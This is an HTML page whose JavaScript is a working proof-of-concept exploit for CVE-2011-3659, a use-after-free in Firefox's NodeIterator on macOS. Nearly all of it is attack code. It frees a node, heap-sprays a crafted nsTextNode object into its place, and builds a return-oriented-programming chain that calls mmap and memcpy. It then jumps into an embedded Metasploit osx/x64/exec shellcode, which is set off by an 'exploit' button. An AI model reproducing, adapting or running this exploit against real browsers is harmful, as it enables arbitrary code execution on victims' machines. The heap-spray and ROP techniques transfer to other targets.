<html>
<head>
<script>
// @nijalali
//nijalali.blogspot.com

// metasploit osx/x64/exec payload
var payload =  unescape ("%u3148%u48c0%u3bb8%u0000%u0002%u0000%ue800%u0037%u0000%u412f%u7070%u696c%u6163%u6974%u6e6f%u2f73%u6143%u636c%u6c75%u7461%u726f%u612e%u7070%u432f%u6e6f%u6574%u746e%u2f73%u614d%u4f63%u2f53%u6143%u636c%u6c75%u7461%u726f%u4800%u3c8b%u4824%ud231%u5752%u8948%u0fe6%u4105");

function run() {

  var attr = document.createAttribute("foo");

  var ni = document.createNodeIterator(
    attr, NodeFilter.SHOW_ALL,
    {acceptNode: function(node) {return NodeFilter.FILTER_ACCEPT; }},
    false);

	container = new Array ();
	
	/*
		0x02a2c0d0	0x00000001	0x46c2e7c0	0x00000001
		0x17099ca0	0x00000001	0x00000000	0x00000000
		0x00000000	0x00000000	0x00000000	0x00000000
		0x00000000	0x00000000	0x00000000	0x00000000
		0x00000000	0x00000000	0x00000000	0x00000000
		0x00000003	0x00000000	0x00000000	0x00000000
		0x00000000	0x00000000	0x02a2c920	0x00000001
	*/
	
	//craft nsTextNode Object
	obj =  unescape("%uc0d0%u02a2%u0001%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0030%u0100%u0001%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
	obj += unescape("%u0000%u0000%u0000%u0000%uc920%u02a2%u0001");

  attr.value =  'bar';

  ni.nextNode();
  ni.nextNode();
  ni.previousNode();

  //free object
  attr.value = null;

	//trigger GC/replace object with the crafted one
  for (i = 0; i < 1024*1024*2; i++) {
  	container[i] = unescape (obj);
  }

	a = ni.referenceNode;

	//0x0000000101529062
	//push %rax
	//pop %rsp
	//mov 0x38(%rsp),%edx
	//mov %edx,0x60(%rax)
	//mov 0x40(%rsp),%edx
	//mov %edx,0x64(%rax)
	//xor %eax,%eax
	//add $0x8,%rsp
	//pop %rbx
	//pop %rbp
	//retq
	
	//0x00000001010138a3
	//pop %rax
	//retq
	
	//0x00000001010017bf
	//pop %rdi
	//retq   
	
	//0x0000000101024897
	//pop %rsi
	//retq
	
	//0x00000001010210C6
	//pop %rdx
	//retq

	//0x000000010104d923
	//pop rcx
	//retq
	 
	// 0x0000000101fd19fb
	// pop    %r10
	// pop    %rbp
	// retq 

	//0x0000000101ED3350
	// dec    %r8
	// cmp    %r8,%rdi
	// jbe    0x101ed3320
	// mov    $0xffffffff,%eax
	// retq 

	//0x0000000101ecee0d
	// dec    %r8
	// cmp    $0xffffffffffffffff,%r8
	// jne    0x101ecedf0
	// mov    $0x1,%edx
	// mov    %edx,%eax
	// retq  

	//0x0000000101ecee34
	// mov    %rdx,%r9
	// mov    0x8(%rdi),%ecx
	// xor    %eax,%eax
	// cmp    0x8(%rsi),%ecx
	// je     0x101ecee50
	// add    $0x8,%rsp
	// retq   

	//0x0000000101abfd2f
	// syscall
	// add    %al,(%rax)
	// mov    0x1c8(%rsp),%rbx
	// mov    0x1d0(%rsp),%rbp
	// mov    0x1d8(%rsp),%r12
	// mov    0x1e0(%rsp),%r13
	// mov    0x1e8(%rsp),%r14
	// mov    0x1f0(%rsp),%r15
	// add    $0x1f8,%rsp
	// retq 
	
	// 0x00000001022787bc
	// mov    %rax,%rdi
	// mov    %rdi,%rax
	// add    $0x28,%rsp
	// pop    %rbx
	// pop    %rbp
	// retq

	// 0x00000001013c826f
	// mov    %rsp,%rsi
	// xor    %r8d,%r8d
	// mov    $0x1,%ecx
	// mov    $0x1,%edx
	// callq  *%rax
	// xor    %eax,%eax
	// add    $0x10,%rsp
	// pop    %rbx
	// retq 
	
	// 0x00000001023FDFA0
	// memcpy address
	
	// 0x000000010100B3AF
	// add rax,rdx
	// jmp rax
	
	ropChain  = unescape ("%u9062%u0152%u0001%u0000"); //stack pivot
	ropChain += unescape ("%u0000%u0000%u0000%u0000"); //GAP
	ropChain += unescape ("%u0000%u0000%u0000%u0000"); //GAP
	ropChain += unescape ("%u3350%u01ed%u0001%u0000"); // dec r8
	ropChain += unescape ("%uee0d%u01ec%u0001%u0000"); // dec r8
	ropChain += unescape ("%u17bf%u0100%u0001%u0000"); // pop rdi
	ropChain += unescape ("%u0000%u0100%u0001%u0000"); // 0x101000000
	ropChain += unescape ("%u4897%u0102%u0001%u0000"); // pop rsi
	ropChain += unescape ("%u0008%u0100%u0001%u0000"); // 0x101000008
	ropChain += unescape ("%u10c6%u0102%u0001%u0000"); // pop rdx
	ropChain += unescape ("%u0000%u0000%u0000%u0000"); // 0x0
	ropChain += unescape ("%uee34%u01ec%u0001%u0000"); // mov r9, rdx
	ropChain += unescape ("%u0000%u0000%u0000%u0000"); // GAP
	ropChain += unescape ("%u17bf%u0100%u0001%u0000"); // pop rdi
	ropChain += unescape ("%u0000%u0500%u0000%u0000"); // 0x5000000 arg1
	ropChain += unescape ("%u4897%u0102%u0001%u0000"); // pop rsi
	ropChain += unescape ("%u1000%u0000%u0000%u0000"); // 0x1000 arg2
	ropChain += unescape ("%u10c6%u0102%u0001%u0000"); // pop rdx
	ropChain += unescape ("%u0007%u0000%u0000%u0000"); // 0x7 arg3
	ropChain += unescape ("%u19fb%u01fd%u0001%u0000"); // pop r10
	ropChain += unescape ("%u1002%u0000%u0000%u0000"); // 0x1002 arg4
	ropChain += unescape ("%uba1a%uba1a%uba1a%uba1a"); // GAP
	ropChain += unescape ("%u38a3%u0101%u0001%u0000"); // pop rax
	ropChain += unescape ("%u00c5%u0200%u0000%u0000"); // mmap syscall number 0x20000c5
	ropChain += unescape ("%ufd2f%u01ab%u0001%u0000"); // syscall
	for (i=0; i < 252; i++) { //create GAP
		ropChain += unescape ("%u0000");
	}
	ropChain += unescape ("%u87bc%u0227%u0001%u0000"); // mov rdi, rax
	for (i=0; i < 28; i++) { //create GAP
		ropChain += unescape ("%u0000");
	}
	ropChain += unescape ("%u38a3%u0101%u0001%u0000"); // pop rax
	ropChain += unescape ("%u10c7%u0102%u0001%u0000"); // retq address
	ropChain += unescape ("%u826f%u013c%u0001%u0000"); // mov rsi, rsp
	for (i=0; i < 12; i++) { //create GAP
		ropChain += unescape ("%u0000");
	}
	ropChain += unescape ("%u10c6%u0102%u0001%u0000"); // pop rdx
	ropChain += unescape ("%u0fff%u0000%u0000%u0000"); // 0xfff
	ropChain += unescape ("%udfa0%u023f%u0001%u0000"); // memcpy address
	ropChain += unescape ("%u10c6%u0102%u0001%u0000"); // pop rdx
	ropChain += unescape ("%u0050%u0000%u0000%u0000"); // 0x50
	ropChain += unescape ("%ub3af%u0100%u0001%u0000"); // add rax,rdx ; jmp rax , w00t :-)
	for (i=0; i < 16; i++) { //create NOP slid
		ropChain += unescape ("%u9090");
	}
	//ropChain += unescape ("%ucccc");
	ropChain += payload;

	a.data = ropChain;
	
	var ropChainAddress = '';
	for (i=0; i < container.length; i++) {
		if (container[i].charCodeAt (48) != 0) {
			ropChainAddress = container[i].substring(44,48);
			break;
		}
	}
	if (ropChainAddress == '') {
		alert("PoC failed");
	} else {
		var arr = new Array ();
		
		while (ropChainAddress.length != 7) {
			ropChainAddress += unescape ("%u4444");
		}

		attr = document.createAttribute("foo");

  	ni = document.createNodeIterator(
    	attr, NodeFilter.SHOW_ALL,
    	{acceptNode: function(node) {return NodeFilter.FILTER_ACCEPT; }},
    	false);

    attr.value =  'bar';

		ni.nextNode();
  	ni.nextNode();
  	ni.previousNode();

  	//free object
  	attr.value = null;
  	
  	for (i=0; i < 1024*1024*2; i++) {
  		arr[i] = unescape (ropChainAddress);
  	}
  	ni.referenceNode;
	}
}

</script>
</head>
<body>
	<h1>CVE-2011-3659</h1>
	<input type='button' onclick='run();' value='exploit' />
</body>
</html>
